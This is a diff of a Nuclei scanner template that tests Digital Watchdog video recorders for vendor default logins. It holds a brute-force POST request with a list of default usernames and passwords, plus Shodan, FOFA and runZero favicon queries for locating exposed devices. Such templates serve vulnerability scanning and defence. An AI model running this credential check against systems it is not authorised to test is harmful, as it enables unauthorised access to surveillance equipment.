@@ -1,45 +1,46 @@
-id: digital-watchdog-default-login
-
-info:
-  name: Digital Watchdog - Default Login
-  author: omranisecurity
-  severity: high
-  description: |
-    Digital Watchdog default login credentials were discovered.
-  reference:
-    - https://digitalwatchdog.happyfox.com/kb/article/686-recorder-and-raid-default-login-list/
-  metadata:
-    verified: true
-    max-request: 8
-    shodan-query: "http.favicon.hash:868509217"
-    fofa-query: "icon_hash=\"868509217\""
-  tags: digital-watchdog,default-login,dw-Spectrum
-
 http:
-  - raw:
-      - |
-        POST /web/rest/v1/login/sessions HTTP/1.1
-        Host: {{Hostname}}
-        Content-Type: application/json
+- attack: clusterbomb
+  matchers:
+  - condition: and
+    dsl:
+    - contains_all(set_cookie, "x-runtime-guid=")
+    - contains(body, "token\":")
+    - status_code == 200
+    type: dsl
+  payloads:
+    pass:
+    - admin
+    - admin1234
+    - admin12345
+    - Dw5pectrum
+    user:
+    - admin
+    - dwuser
+  raw:
+  - 'POST /web/rest/v1/login/sessions HTTP/1.1
 
-        {"username":"{{user}}","password":"{{pass}}","setCookie":true}
+    Host: {{Hostname}}
 
-    attack: clusterbomb
-    payloads:
-      user:
-        - admin
-        - dwuser
-      pass:
-        - admin
-        - admin1234
-        - admin12345
-        - Dw5pectrum
+    Content-Type: application/json
 
-    matchers:
-      - type: dsl
-        dsl:
-          - 'contains_all(set_cookie, "x-runtime-guid=")'
-          - 'contains(body, "token\":")'
-          - 'status_code == 200'
-        condition: and
-# digest: 4a0a00473045022100ca85a9a04c80401e75e8fa4127fb3b77584ef05e3cb1e30aab631b4c110fafc702206ed32ebc02b5afc25342c541d716898e7bb12c96accf1ed7fee1eee55f8ba6d8:922c64590222798bb761d5b6d8e72950
+
+    {"username":"{{user}}","password":"{{pass}}","setCookie":true}
+
+    '
+id: digital-watchdog-default-login
+info:
+  author: omranisecurity
+  description: 'Digital Watchdog default login credentials were discovered.
+
+    '
+  metadata:
+    fofa-query: icon_hash="868509217"
+    max-request: 8
+    runzero-match: service["favicon.ico.image.mmh3"] == "868509217"
+    shodan-query: http.favicon.hash:868509217
+    verified: true
+  name: Digital Watchdog - Default Login
+  reference:
+  - https://digitalwatchdog.happyfox.com/kb/article/686-recorder-and-raid-default-login-list/
+  severity: high
+  tags: digital-watchdog,default-login,dw-Spectrum,vuln
